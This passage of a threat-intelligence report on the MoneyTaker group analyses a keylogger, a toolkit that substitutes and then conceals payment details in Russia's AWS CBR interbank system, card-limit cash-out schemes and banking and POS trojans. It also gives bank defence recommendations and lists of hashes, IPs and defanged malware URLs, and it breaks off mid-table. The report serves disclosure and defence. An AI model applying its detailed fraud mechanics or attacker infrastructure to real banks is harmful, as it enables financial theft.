<br></b></font><style>textarea\n{width:100%; height:7em;}</style><textarea readonly>some _\nentered _ word</textarea><br><br><b><font color =\n«green»>[ OllyDbg - 1.exe - [CPU - main thread, module\n1] - 2:54:25 - 11.11.2017 ] <br></b></font><style>textarea\n{width:100%; height:7em;}</style><textarea readonly>\n\n```\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 18\n\n- The keylogger records the results of the interception to the\nTForm1.Memo1 object located on the application’s main form.\nFrom here data can be obtained for further recording to a file\nin a temporary directory.\n\n- EnviaTimer. Using the API function GetClipboardData () it can\nintercept the contents of the clipboard\n\n- The anti-emulation function is implemented in the timer\ncode to bypass antivirus and automated sample analysis\nby calling the ValidateName () function. Purportedly, this\nmethod of anti-emulation was copied from a public Russian\nspeaking source (the forum https://fuckav.ru/showpost.\nphp?p=109096&postcount=63) and was implemented with an\nerror, due to which the functions of taking screenshots and\nwriting data to a file (which is located in code after checking\nfor emulation) may not be executed.\n\n- It takes a screenshot of the desktop, compresses it into JPEG\nand encodes in base64\n\n- It creates a file with the name “%Temp%\\perflog1.tmp”\n\nExample of the contents of the “%Temp%\\\nperflog1.tmp” file collected by keylogger\nand screenshotter\n\n- Network communications used to send collected data have\nnot been detected in the analyzed file.\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 19\n\n\n### ATTACK ON AWS CBR\n\n\n###### 06\n\n\nIn August 2016 hackers successfully infiltrated the network of a\nRussian bank. They used an automated system to steal money\nthrough the AWS CBR (Automated Work Station Client of the\nRussian Central Bank), an interbank fund transfer system.\n\n|Name|MD5|Type|\n|---|---|---|\n|main.exe igfxserv.exe|D57608F6DB9045752165EAF93452D57F|Main module|\n|xml.exe|A70F905266F3D57B73B1D8A265286FD5|Module used to substitute payment messages|\n|ed.exe|92B03E123B2D97B8E8E274224273EC5E|Module used to hide fraudulent transfers|\n|txt.exe||Module used to work with temporary files|\n|arsm32.exe|A70F905266F3D57B73B1D8A265286FD5|UltraVNC|\n|hostsec64.exe|92B03E123B2D97B8E8E274224273EC5E|VNC client|\n|hostsec32.exe||VNC client|\n|empty32.exe|A70F905266F3D57B73B1D8A265286FD5|VNC client|\n|test64.exe|1E4499560CDD2F69ECBED8761CAC7272 8B1B5D1C8430EC16735E5DED94112B18|Meterpreter https://185.86.149.140/Y0DNA:443|\n|test32.exe|09A7F9813F6DE28F2D7BCBA032390662|Meterpreter|\n|btcp32.exe||Meterpreter|\n|load64.exe||Meterpreter|\n|plink.exe|B5450C8553DEF4996426AB46996B2E55|185.86.149.140|\n|Far.exe|||\n|4.bat|||\n|nbt.EXE|||\n|hkcmd.exe|4672E624C5210A523AA0A0B56DB677B6|Keylogger stores logs in snmp.dat|\n|at1.bat|||\n|startdll32.exe|||\n|qpd.exe|||\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 20\n\nHaving accessed the bank’s internal network, hackers\ndownloaded a modular tool called Moneytaker v5.0 to the server\nof the AWS CBR. This is the tool which the group has been named\nafter.\n\nIts main module is located in the directory “c:\\intel\\logs\\1\\mt\\bin”\nand has the name “main.exe” or “igfxserv.exe”. This is a program\nwithout network communications and it should run with the\nmain configuration file specified as an argument. It is initialized\naccording to the configuration file, then it checks the presence\nof the modules specified in the configuration file and backups of\ncertain AWS CBR directories.\n\nFurther through the report, in the behavior description which\ndepends on the configuration file, the name of the argument will\nbe specified.\n\n###### MAIN MODULE – “MAIN.EXE” OR  “IGFXSERV.EXE”\n\nThe main module is started by passing the main configuration\nfile “c:\\intel\\logs\\1\\mt\\config\\main-config.txt” as an argument. The\nmodule logs all events to the “Main-Logfile” file. Upon startup,\nthe module looks for XML, ED and TXT modules specified in the\nconfig file as “XmlBin” “EdBin” and “TxtBin”, respectively. They\nalso search for their configuration files, the parameters: “XmlCfg”\n“EdCfg” and “TxtCfg”. If configuration files of modules do not exist\nas separate files, their settings are stored together in the “mainconfig.txt” file.\n\nThe module reads the “Directory” “Backup” “Recursive”\n“Action” parameters and uses the WINAPI function called\nReadDirectoryChangesW() to monitor the files appearing in the\ndirectories specified in the “Directory”.\n\nDirectory name Designation in AWS CBR\n\n%АРМ КБР%\\exg\\chk Decrypted, unpacked and verified electronic messages\n\n%АРМ КБР%\\exq\\cli Received messages from AWS CBR formed according to the\nunified formats of electronic messages of the Central Bank\nof Russia\n\n%АРМ КБР%\\tmp Temporary files\n\nWhen a new file appears, the corresponding module is started (ED\nfor the “chk” directory, XML for the “cli” directory and TXT for the\n“tmp” directory) and copied to the directory specified as “Backup”.\n\n|Directory name|Designation in AWS CBR|\n|---|---|\n|%АРМ КБР%\\exg\\chk|Decrypted, unpacked and verified electronic messages|\n|%АРМ КБР%\\exq\\cli|Received messages from AWS CBR formed according to the unified formats of electronic messages of the Central Bank of Russia|\n|%АРМ КБР%\\tmp|Temporary files|\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 21\n\n**AWS CBR**\n**operator**\n\n**ED101**\nA legitimate payment\norder issued by\nAWS CBR operator\n\n**ED.EXE**\n\n**%ARM_CBR%\\exg\\cli** **%ARM_CBR%\\exg\\chk** restores original\n\npayment details\n\n**AWS CBR operator**\nreceives the response\n\n**AWS CBR** as if the payment\n**validation component** details were the initial\n(checks the correctness ones, without\nof the payment message) suspecting the theft.\n\nPayment order with\nthe fraudulent payment\ndetails is sent to the\n**Central Bank of Russia**\n\n###### AUTOMATED REPLACEMENT MODULE –  “XML.EXE”\n\nThe main module starts the “xml.exe” file, passing the name of a\nnew file in the “%АРМ КБР%\\exq\\cli” directory and the config file.\n\nThe automated replacement module records detailed logs and\nwrites them to a file specified in the configuration as “Xml-Logfile”\n\nElectronic messages generated by the AWS CBR are placed in\nthe “%АРМ КБР%\\exq\\cli” directory for further processing by\nthe gateway component “Input control”. It is at this point that the\nmodule checks the xml file for validity and determines whether the\nelectronic message file is a payment order (the “ED101” type).\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 22\n\nFor ED101, the module scans for the fields “Purpose”, “Payer”,\n“PersonalAcc”, “Payee”, “Name”, “Bank BIC”, “CorrespAcc”, “KPP”,\n“INN”, “SUM”, “AccDocNo”.\n\nThen it reads the file with the fraudsters’ payment details - “XmlWorkfile”. The following fields are specified: ”name”, ”id”, ”acc”,\n“inn”, “kpp”, ”bik”, ”corr”, ”purpose”.\n\nIf it manages to get all the necessary fields from the payment\norder and the “Xml-Workfile” file has required details, then the\npayment order will be modified by substituting original payment\ndetails with fraudulent ones. That said, the payment amount does\nnot change, and for each replaced document the attackers have a\nseparate account. The accounts for which the money goes are not\nrepeated.\n\nThe success of replacement is due to the fact that at this stage\nthe payment order has not yet been signed, which will occur after\npayment details are replaced.\n\nFor further operation of another module - ED, after each\nautomated replacement the XML module stores information in the\n“Xml-Resultfile” file in the following format:\n\n```\n#\nId=\nOrigAcc=\nOrigBic=\nOrigCor=\nPurpose=\nHackAcc=\nHackBic=\nHackCor=\nSum=\nPayerPersonalAcc=\n#\n\n```\n\n###### CONCEALMENT MODULE – ED.EXE\n\nThe “ed.exe” file is started by the main module passing the name\nof a new file in the “%АРМ КБР%\\exq\\chk” directory and the\nconfiguration file.\n\n- After the payment order is modified, signed and sent, the\nfollowing activity is performed:\n\n- It is transferred to the logical control where the correctness\nof the electronic payment message is checked, and the\ncompliance of the payment details with reference data is\nestablished\n\n- The program checks the possibility of payment within the\namount of liquid funds in the bank account\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 23\n\n                - The electronic payment message is accepted for execution;\nthe funds are debited from the payer’s account and credited\nto the beneficiary’s account\n\n                - Based on the results of execution, an electronic message\nED206 (confirmation of debit) is sent to the address of the\nissuer.\n\n                - The message is decrypted, unpacked, passes the verification\nof the authentication code and security code and is stored in\nthe “%APM KBR%\\exq\\chk” directory\n\n                - The main module starts the concealment module passing the\nincoming electronic message.\n\nThe ED module checks whether the incoming electronic\nmessage is ED206 (debit/credit confirmation following the results\nof debit transaction) or ED211 (following the results of the day or\npayment batch).\n\nFor ED206, the field “CorrAcc” is verified, for ED211 the\n“PayeePersonalAcc” field is verified. The values of these fields\nare compared with HackAcc in the “Xml-Resultfile” file (this\nis the file in which the XML module stores information about\nreplacements).\n\nIf the values match, then the module restores the original\npayment details.\n\nThis means that the payment order is sent and accepted for\nexecution with the fraudulent payment details, and the responses\ncome as if the payment details were the initial ones. This gives\ncybercriminals extra time to mule funds before the theft is\ndetected.\n\n###### TEMPORARY FILE MODULE – TXT.EXE\n\nThe main module is also able to start the TXT module by passing\nthe name of the temporary file of the AWS CBR as an argument.\nHowever, we have not managed to obtain this module and do not\nknow its function.\n\nAll MoneyTaker modules do not have information displayed\nand actively record their activity to log files. There is also the\npossibility of a test run, which is performed after installation on a\ncomputer with AWS CBR. Hackers use it to control the program\noperation.\n\nAfter this attack, they did not conduct a single new attack on the\nAWS CBR using this tool.\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 24\n\nIn November 2017, they again attacked another bank in Russia.\nHackers managed to gain access to the servers and workstations\nof AWS CBR operators, but they were not able to use MoneyTaker\nmalware because the server was in a completely isolated\nsegment.\n\nAfter an unsuccessful attempt to steal money through the system\nof interbank transfers, they switched their focus to card processing\nas in the the US based attacks.\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 25\n\n###### 07\n\n### POTENTIAL ATTACKS ON SWIFT\n\nThrough analysis of the attackers’ infrastructure, we\ndiscovered that they always try to steal internal banking system\ndocumentation: administrator guides, internal instructions and\nregulations, change request forms, transaction logs, etc.\n\nWe did not find any evidence of successful attacks on SWIFT\nconducted by this group, nor did we find any connections with\nalready known incidents, for example, in Hong Kong, Ukraine, or\nTurkey. However, we know that in addition to the abovementioned\ndocuments these threat actors search for and copy documents\nrelated to SWIFT, which may indicate pending attacks on this\nsystem. Now hackers have the following documents at their\ndisposal:\n\n                          - Installation and Administration Guide for SWIFT Alliance\nAccess 7.0\n\n                          - Security Guide for SWIFT Alliance Access 7.0\n\n                          - System Administrator Procedures, for Ocean Systems’ wire\ntransfer product FedLink\n\n                          - User Procedures Manual, for Ocean Systems’ wire transfer\nproduct FedLink\n\nThe two last mentioned documents are of interest, because\nthey describe how to make transfers through SWIFT using the\nFedLink system. According to FedLink’s official website, now they\nhave more than 200 customers in the US and Latin America. We\nassume that banks in Latin America may become the next target of\nthis group.\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 26\n\n\n### ATTACK ON CARD PROCESSING\n\n\n###### 08\n\n\nThe first attack on card processing that we attribute to this group\nwas conducted in May 2016.\n\nHaving gained access to the bank network, the attackers\ncompromised the workstation of First Data’s STAR network portal\noperators, making the changes required and withdrawing the\nmoney. In January 2017, the attack was repeated in another bank.\n\nFocusing on card processing systems enables the attackers to\ncarry out attacks that are easier and safer for ‘money mules’ who\nprovide cash withdrawals. The attackers are in one country, the\nvictim bank is in another and cash is withdrawn by mules in a third\nlocale. This scheme is simple to implement and does not require\nmuch investment from attackers. That explains its increased usage\nby cybercriminal groups such as Moneytaker and Cobalt.\n\nThe scheme is extremely simple:\n\n- After taking control over a bank network, the attackers\nchecked if they could connect to the card processing system.\n\n- They legally opened or bought cards of the bank whose IT\nsystem they had hacked.\n\n- Money mules – criminals who withdraw money from ATMs –\nwith previously activated cards deployed and waited for the\noperation to begin.\n\n- After getting into the card processing system, the attackers\nremoved or increased cash withdrawal limits for the cards held\nby the mules.\n\n- They removed overdraft limits, which made it possible to go\noverdrawn even with debit cards.\n\n- Using these cards, the mules withdrew cash from ATMs, one\nby one. The average loss caused by one attack was about\n$500,000 USD.\n\nAs in the case with the attacks on SWIFT, they gather internal\ndocuments from banks in order to get a better understanding of\nhow to handle certain systems.\n\n\nFigure. Screenshot of the\nguidelines on card transaction\nprocessing via terminal\n\nFigure. Fragment on Credit limit\nincrease from the card processing\nguidelines\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 27\n\n###### 09\n\n### USING BANKING TROJANS\n\nThrough analysis of the C&C server used to conduct targeted\nattacks on banks, we discovered two related files:\n\nName MD5 Type\n\nc4c.exe c7d20b726708a441db3d864457a097833654719513990f823b1deb7c48b65472 Citadel\n\ncbcs.exe e01e9cdfff085393362e1e2e3ec8cae33c536053760e65c7617d5a0dfd005874 Citadel Backconnect Server\n\nThe c4c.exe file uses the following address as the C&C server:\nhххp://82.146.54.5/api/cfg.ashx\n\nThe sample was distributed online as a document named\n\n|Name|MD5|Type|\n|---|---|---|\n|c4c.exe|c7d20b726708a441db3d864457a097833654719513990f823b1deb7c48b65472|Citadel|\n|cbcs.exe|e01e9cdfff085393362e1e2e3ec8cae33c536053760e65c7617d5a0dfd005874|Citadel Backconnect Server|\n\n```\nfedwire _ 22127061503 _ output _ report.doc (2818a0c63d729cb\n1f2d223e15c762209), which was downloaded from the server\nhxxp://188.120.235.201/fce2857010e1.exe (369ad5f7bc9a555f3395059\n978c720bb)\n\n```\n|Col1|Related indicators:|Col3|\n|---|---|---|\n|c4c.exe|82.146.54.5|Citadel|\n|fedwire_22127061503_output_report.doc|188.120.235.201|Downloading the file fce2857010e1.exe|\n|fce2857010e1.exe|82.146.54.5|Citadel|\n|operating_circular_6_app_e1.docm|www.riverbed.com 188.120.235.201 188.120.230.218 82.146.54.5||\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 28\n\n\n### USING POS TROJANS\n\n\n###### 10\n\n\nThrough analysis of the C&C server used to conduct targeted\nattacks, we discovered two related files:\n\nName MD5\n\nEmployeeID-847267.doc 83d21d808f7408ebcb3947cb88366172\n\n203.exe 70d8729ca630dd3b0f9a62998642ec76\n\nIn November 2016 researchers at Proofpoint reported large email\nphishing campaigns, primarily targeting companies in the UK and US.\nThe email messages contained a malicious document, or a phishing link.\n\nWhen the victim opened the attached document, a macro which\ndownloaded Kronos banking Trojan form the URL\n\n|attacks, we discovered|two related files:|Col3|\n|---|---|---|\n|Name|MD5|Type|\n|EmployeeID-847267.doc|83d21d808f7408ebcb3947cb88366172|Document with marcos|\n|203.exe|70d8729ca630dd3b0f9a62998642ec76|Kronos|\n\n\nhxxp://info.docs-sharepoint[.]com/officeup[.]exe.\n\n\nIn the investigated case the “203.exe” file was downloaded from the\nfollowing link:\n\nhххp://profile.invoice-sharepoint.com/Emplid/officeup.exe, in the\nevent of opening the file LHarv.xls (de05666412026c6d6c4740b79bc\n```\n71dbd6420c0c62ad59cbadcd7d506614bc87d)\n\n```\nThe Kronos banking Trojan reported by Proofpoint installed three\npayloads from the following URLs:\n\nhxxp://networkupdate[.]online/kbps/upload/c1c06f7d[.]exe Smoke Loader\n\nhxxp://networkupdate[.]online/kbps/upload/1f80ff71[.]exe Smoke Loader\n\nhxxp://networkupdate[.]online/kbps/upload/a8b05325[.]exe ScanPOS\n\nScanPOS is a unique point-of-sale (PoS) malware. Upon execution,\nScanPOS grabs information about the current running processes and\ncollects the user name and privileges on the infected system. That said,\nit is primarily designed to dump process memory and search for payment\ncard track data. The Trojan checks any collected data using Luhn’s\nalgorithm for validation and then sends it outbound to the C&C server.\n\nThe C&C address for ScanPOS was hxxp://invoicesharepoint[.]com/\ngateway[.]php\n\n|payloads from the following URLs:|Col2|\n|---|---|\n|hxxp://networkupdate[.]online/kbps/upload/c1c06f7d[.]exe|Smoke Loader|\n|hxxp://networkupdate[.]online/kbps/upload/1f80ff71[.]exe|Smoke Loader|\n|hxxp://networkupdate[.]online/kbps/upload/a8b05325[.]exe|ScanPOS|\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 29\n\n###### 11\n### RECOMMENDATIONS\n\nRun an indicator check-up in the following section\n\n###### Operating system security\n\n                          - Prohibit any remote logon to the system (RDP, SMB, RPC) for\nlocal administrators. We recommend that you use only Logon\ntype 2 (interactive): https://technet.microsoft.com/en-ie/library/\ncc787567(v=ws.10).aspx\n\n                          - Configure the following parameter in the registry on all PCs\nrunning Windows 7 (and up) and all the servers using Windows\n2008R2:\n\n```\nHKEY _ LOCAL _ MACHINE/SYSTEM/CurrentControlSet/Control/\nSecurityProviders/WDigest/UseLogonCredential=0\n\n```\n\nThis registry key prohibits storing unencrypted passwords in\nRAM (which are usually leveraged by Mimikatz)\n\n- Prohibit a standard local administrator with an ID=500 (which\nis vulnerable pass-the-hash attack). Add another administrator\nand install updates to protect against Pass the hash attacks:\nhttps://technet.microsoft.com/library/security/2871997#ID0E3D\n\n- Minimize and completely deny granting administrator\nprivileges for users of local PCs, especially for users who work\nwith external information systems.\n\n- Use a different local Administrator account password on\nevery node, which must not match any domain administration\ncredentials. If this rule is not currently applied – change all the\npasswords, make them unique, long and complex. Securely\nmanage local Administrator passwords by using specialized\ntools, such as Microsoft’s Local Administrator Password\nSolution (LAPS).\n\n- Deny granting domain administrator privileges for common\nuser accounts. In order to perform domain administrative\ntasks, create a separate additional domain user account for\neach administrator, while preventing them from performing\ndaily routine administrator work on their PCs under an account\nwith administrative rights.\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 30\n\n- Isolate hosts in the same VLAN, so that one workstation would\nnot be able to gain access to another one on network levels\nL2/L3, and could access shared network segments (printers,\nservers, etc.).\n\n- Provide timely updates of OS, antivirus software and other\napplications.\n\n- Configure the service accounts with the minimum set of\npermissions necessary for them to function properly (with\nrespect to logon type and group membership). Strictly prohibit\nadding service accounts to the local administrators group\nunless absolutely necessary.\n\n- Use IDS solutions and a sandbox to analyze files. We\nrecommend that companies apply technology like GroupIB’s TDS Sensor and sandbox, which are able to detect and\nprevent these types of attacks.\n\nMeasures to protect interbank transfer system, card processing\nand ATMs\n\n- Isolate hosts of workstations and servers related to the\ninterbank transfer system.\n\n- Ensure the integrity of data, system and application software\ndeployed on the infrastructure servers; introduce application\nwhitelisting on workstations.\n\n- Ensure monitoring and notifications in case of anomalous time\nof access to servers and workstations by operators of financial\nsystems.\n\n- Ensure monitoring and notifications of changes to overdraft\nand cash withdrawal limits.\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 31\n\n### ABOUT GROUP-IB\n\n###### GROUP-IB HELPS MAJOR CORPORATIONS RECOGNIZE AND REACT TO THE MOST SOPHISTICATED CYBER- THREATS.\n\n\n###### Profound human intelligence and cutting- edge technology\n\n**NETWORK INFRASTRUCTURE**\n\n- HoneyNet and botnet analysis\n\n- Hacker community infiltration\n\n- Open-source monitoring\n\n- Network attack trackers\n\n- TDS Sensors\n\n- Behavior analysis system\n\n\nGroup-IB leverages its proprietary high-tech infrastructure to monitor\nhacker activity and extract unique data. These data is accomplished\nby profound human intelligence by experts who conduct incident\nresponse and monitor the most secretive underground hacker forums.\n\n\n**HUMAN INTELLIGENCE**\n\n- Forensics\n\n- Investigations\n\n- Malware monitoring and research\n\n- CERT-GIB request database\n\n- Security assessment\n\n- Group-IB case studies\n\n\n**GLOBAL DATA EXCHANGE**\n\n- Computer incident response teams\n\n- Domain registrar and hosting providers\n\n- Cyber security vendors\n\n- Cybersecurity associations\n& professional organizations\n\n- Europol, Interpol and law\nenforcement agencies\n\n\nWORLD\nEUROPOL INTERPOL ECONOMIC IDC GARTNER FORRESTER\nFORUM\n\n\nOfficial ЕUROPOL Recommended by the\nand INTERPOL partner Organization for Security and\nCo-operation in Europe (OSCE)\n\n\nMember of the World Group-IB Threat Intelligence has\nEconomic Forum been recognized by top industry\nresearcher reports\n\n\n###### Products and services powered by Threat Intelligence\n\n\nComprehensive ecosystem of threat intelligence and security\nsolutions empowers organizations to identify threats sooner,\nrespond faster, and build more effective defenses against\nsophisticated cyberattacks.\n\n\n**EARLY WARNING SYSTEM**\n\n - Threat Intelligence\n\n- TDS\n\n- Secure Bank\n\n- Secure Portal\n\n\n**PREVENTION**\n\n- Security audit\n\n- Compromise Assessment\n\n- Red Teaming\n\n- Brand Protection\n\n- Antipiracy\n\n\n**RESPONSE 24/7/365**\n\n- Computer Emergency\nResponse Team\nCERT-GIB\n\n\n**RESPONSE 24/7/365**\n\n- Digital forensics and\nmalware analysis\n\n- Incident investigation\n\n- Financial and corporate\nInvestigation\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 32\n\n###### 12\n\n### INDICATORS OF COMPROMISE\n\nMalicious SSL certificates\n\nIssuer SSL fingerprint IP, where it was used\n\nMetaBank LTD 8b7fa4ef88a303bb47240c9b8012c80507074f2e 83.220.172.71\n\n37.46.133.190\nYahoo Inc. c29d79df9b5416fd416c31e57cd525dfc23a8f66\n\n172.86.121.11\n\nFiserv Inc b3dd855fc1b32757bde5c9f737808f150d6f57e6 146.185.243.19\n\nMicrosoft Ltd 98cbe44e1a30448a3ff6be38e8b277ae189f9b45 82.146.54.5\n\nFederal Reserve Bank 5fe7f5924ee2382dbfa5c8bdc6d04f0ff5d9273a 188.120.235.201\n\n188.120.230.218\nBank of America 5922a06f03f6464921462c07842afb18da1577e9\n\n188.120.230.235\n\nVMware 7aa02d827609e0b6b3dca6d0ef82fe3a1fbe1d67 185.141.25.222\n\nPrivilege escalation\n\n|Issuer|SSL fingerprint|IP, where it was used|\n|---|---|---|\n|MetaBank LTD|8b7fa4ef88a303bb47240c9b8012c80507074f2e|83.220.172.71|\n|Yahoo Inc.|c29d79df9b5416fd416c31e57cd525dfc23a8f66|37.46.133.190 172.86.121.11|\n|Fiserv Inc|b3dd855fc1b32757bde5c9f737808f150d6f57e6|146.185.243.19|\n|Microsoft Ltd|98cbe44e1a30448a3ff6be38e8b277ae189f9b45|82.146.54.5|\n|Federal Reserve Bank|5fe7f5924ee2382dbfa5c8bdc6d04f0ff5d9273a|188.120.235.201|\n|Bank of America|5922a06f03f6464921462c07842afb18da1577e9|188.120.230.218 188.120.230.235|\n|VMware|7aa02d827609e0b6b3dca6d0ef82fe3a1fbe1d67|185.141.25.222|\n\n|File name|SHA256|Description|\n|---|---|---|\n|ASLRSideChannelAttack. exe|9a82aa5af19fa0a6167f87ee500856d53690c92c8c6449af54d8e5 d33cf8bff4|LPE Win10x64|\n|cve.bat|7ff092853c15b51315414939c165ea9bce1f920d2d99e570d747ee7fc 9fa734a|BAT LPE executor|\n|cve.exe|98b6f9172ca273deef324f032a8e992b6e6ca3c6542449a48246b3 646b6c8cb6|cve-2016-7255|\n|cve-2016-7255.exe|5ec6a6c9a7233a7ff68d989d830a2249e94a2784e69d5c8a593d3 345da14a6b5|cve-2016-7255|\n|cve-2016-7255test.exe|df69966d721193e2315723dd71636b93cc76b38cfa046dce45d7aec 4856f4bee|cve-2016-7255|\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 33\n\nKeylogger and Sreenshotter\n\nFile name SHA256 Description\n\nDropper of Keylogger/\nperfmon.exe 2049df4a5f92709bad14a7e2b8c0cfcb6ede2f71009cb3483892108e949800e6\nScreenshotter\n\nDropper of Keylogger/\nperfmonpe.exe ff3c84266fdba3638b9fc1a41cab87cf4021eb531954343d1a328b307b586ac6\nScreenshotter\n\nDropper of Keylogger/\nrecycler.exe 206aec8132cbb2497553b1f2c1c40733188929bad2feb0640e99474b327e564b\nScreenshotter\n\nxkey.exe b2e02579cf0e9c2a57bff806b57d6b868d5d411264d38ff7ac7e6b47d0d2a33d Keylogger/ Screenshotter\n\nxkey_x86.dll 60e6652ae39ecd9314ba0e7936b41ca813737183c4eaa96dce0b4a36a90375dd Keylogger/ Screenshotter\n\nhkcmd.exe 4672E624C5210A523AA0A0B56DB677B6 Keylogger stores logs in snmp.dat\n\nMalware for AWS CBR\n\nFile name SHA256 Description\n\nmain.exe 77003E4E6EB091643DFF0C0F967D8C9001DE7D8689E493D67D0F4275\n\nMain module\nigfxserv.exe CC189083\n\n5F6D1B1728EAE505B23C7FD16E04AD534D44465AFE4C3FD420475CAB2 Module which replaces payment\nxml.exe\n5B61B02 data\n\n2B365805E50A09B0149FF2E706CB19D7FAC71FC6B1D1273BE8EB3E93875 Module which replaces / hides\ned.exe\n0C23B fraud transactions\n\nModule which operates with\ntxt.exe was not restored\ntemp files\n\nMeterpreter\n\n|File name|SHA256|Description|\n|---|---|---|\n|perfmon.exe|2049df4a5f92709bad14a7e2b8c0cfcb6ede2f71009cb3483892108e949800e6|Dropper of Keylogger/ Screenshotter|\n|perfmonpe.exe|ff3c84266fdba3638b9fc1a41cab87cf4021eb531954343d1a328b307b586ac6|Dropper of Keylogger/ Screenshotter|\n|recycler.exe|206aec8132cbb2497553b1f2c1c40733188929bad2feb0640e99474b327e564b|Dropper of Keylogger/ Screenshotter|\n|xkey.exe|b2e02579cf0e9c2a57bff806b57d6b868d5d411264d38ff7ac7e6b47d0d2a33d|Keylogger/ Screenshotter|\n|xkey_x86.dll|60e6652ae39ecd9314ba0e7936b41ca813737183c4eaa96dce0b4a36a90375dd|Keylogger/ Screenshotter|\n|hkcmd.exe|4672E624C5210A523AA0A0B56DB677B6|Keylogger stores logs in snmp.dat|\n\n|File name|SHA256|Description|\n|---|---|---|\n|main.exe igfxserv.exe|77003E4E6EB091643DFF0C0F967D8C9001DE7D8689E493D67D0F4275 CC189083|Main module|\n|xml.exe|5F6D1B1728EAE505B23C7FD16E04AD534D44465AFE4C3FD420475CAB2 5B61B02|Module which replaces payment data|\n|ed.exe|2B365805E50A09B0149FF2E706CB19D7FAC71FC6B1D1273BE8EB3E93875 0C23B|Module which replaces / hides fraud transactions|\n|txt.exe|was not restored|Module which operates with temp files|\n\n|File name|SHA256|\n|---|---|\n|test64.exe|187E4204036445E6A86DB015166F271C472F40CC7D0224B3995686856917D64C|\n|test64.exe|642eae9a42c06265444577fc28165dab99efe3495eeae1be95b8608867f8276d|\n|test32.exe|649fc133ddacc38fb7f2a730f261365e03b84de7f8ccd942573165ba5ff62728|\n|asys.exe|6ce7c4cb9e51116a4565e9b2e129335a4d23cfc51a32080aa9f25689cb1c6ef2|\n|cmd.exe|7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f|\n|launch-paranoid-stageless3. exe|f98b0220a11b57e3c812e7f86f5e5c3f8bbdb5d5ce9dc7b721e28a7f28ecb1ef|\n|mencstager.exe|7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f|\n|msc.exe|0b778857bbc4ec36020d021f475ff90550134beb9506c53071652421e10ddfff|\n\n\nmsc3.exe 0b778857bbc4ec36020d021f475ff90550134beb9506c53071652421e10ddfff\n\n\n-----\n\n1.5 YEARS OF SILENT OPERATIONS 34\n\nmsc4.exe 53c789565821b6eb64bd7f002e38b8259bde3bbbb39798c82657b2b5d59bcd9f\n\nmsc5.exe 98fb846df3687b3c9c7fa66f39d6c70948e8330489be7c787e1f2c3b23f8d205\n\nmsc6.exe 92afe22f494a849345b18d2b302e71a4336871a7956795a7188280e4c7bd8607\n\nmsc7.exe 73b8ed8f14ec2260ae332603f723a5eb0a52c4c997454904e3d5ff254a27a6e6\n\nputtyx.exe e19e48ed659981c4d79c20f1ba9c2ab9af4fb94c67c71f64d0ea48be3ff9da97\n\nrc4.dll 8a0be0a97ba19d4498b58365d36ba5461039e41f73bbd745b15b80fc21e38c3f\n\nrc4.exe a7035c20c32ad4cd1cc76b211f6258fc5858e4bc43031d04e3655b38b666c0c4\n\nrc4.hta 72ee03b51544002df3e25d1a730e650389bdbd5f1cff91488ed9e05944b3cb52\n\nMeterpreter related scripts\n\n|msc4.exe|53c789565821b6eb64bd7f002e38b8259bde3bbbb39798c82657b2b5d59bcd9f|\n|---|---|\n|msc5.exe|98fb846df3687b3c9c7fa66f39d6c70948e8330489be7c787e1f2c3b23f8d205|\n|msc6.exe|92afe22f494a849345b18d2b302e71a4336871a7956795a7188280e4c7bd8607|\n|msc7.exe|73b8ed8f14ec2260ae332603f723a5eb0a52c4c997454904e3d5ff254a27a6e6|\n|puttyx.exe|e19e48ed659981c4d79c20f1ba9c2ab9af4fb94c67c71f64d0ea48be3ff9da97|\n|rc4.dll|8a0be0a97ba19d4498b58365d36ba5461039e41f73bbd745b15b80fc21e38c3f|\n|rc4.exe|a7035c20c32ad4cd1cc76b211f6258fc5858e4bc43031d04e3655b38b666c0c4|\n|rc4.hta|72ee03b51544002df3e25d1a730e650389bdbd5f1cff91488ed9e05944b3cb52|\n\n|File name|SHA256|\n|---|---|\n|debug.vbs|c8d4ba78c89bdb1af01100518db53bf88e0120c89ba7e346e7fcda4b56a07595|\n|drives.vbs|f51d42946cc7f17114a3acc0d9678f2fa5ee4527a877b6b8071df22c26cfe6c1|\n|gatherNetworksInfo.vbs|a3da7fd3dd3c12f6b0f3ce7d96906e8fcdcc0817a546777a5b37b9b1d1ec954d|\n|link.vbs|701e99c1a84dd8e84b252512ff13b777a3f2135f7cdf3873086e021b19289681|\n|link2.vbs|fffd31faa176cee8c41dac2542308c3e9e553f3d7a9ce9a6422b390ffb23e511|\n|link3.vbs|2267bbf93860dd1c62da2308a3bd2a265c418af1a3257c8649f6495de6a3d392|\n|link4.vbs|5f254208721c87c274ab26ce4c21765efe56cfa65ee67bfb60c783097839f169|\n|link5.vbs|0f6bff21f72b017de70556f5f7507b470e182e7f4f5ee9d6a72f7aff0c957218|\n|link6.vbs|a467d30dd3138b300a15b733a92482a9f545d217c6c7c89e5ea975eb021002f5|\n|link7.vbs|e360066239e8c19d50b625c8b935fe7f026ade845470250bf6b6aa2cb3943af0|\n|lmagent.vbs|7180d79351741e8d53143e538aa46a7cc528fbae1baf9d1f95f362ef5b8d95e2|\n|logon.vbs|f51d42946cc7f17114a3acc0d9678f2fa5ee4527a877b6b8071df22c26cfe6c1|\n|msdefender.bat|8cfeb71eaaa3df217e15a449bc4656841b58a4737760d956b1c8e6039cff61e6|\n|OLD_winstart.vbs|5f5ae87472013f6ec2c6d261e6675aa7b143dcaf3f5e372a51feb61a34097efe|\n|proxystager.bat|3a163bb0a8abe244815836a05fab48b640ec537bd76c92b7857db18657d2a774|\n|ps.bat|9e9149ae6092c4a5bd4